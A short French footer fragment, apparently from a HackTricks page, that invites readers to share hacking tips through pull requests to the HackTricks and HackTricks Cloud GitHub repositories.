* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
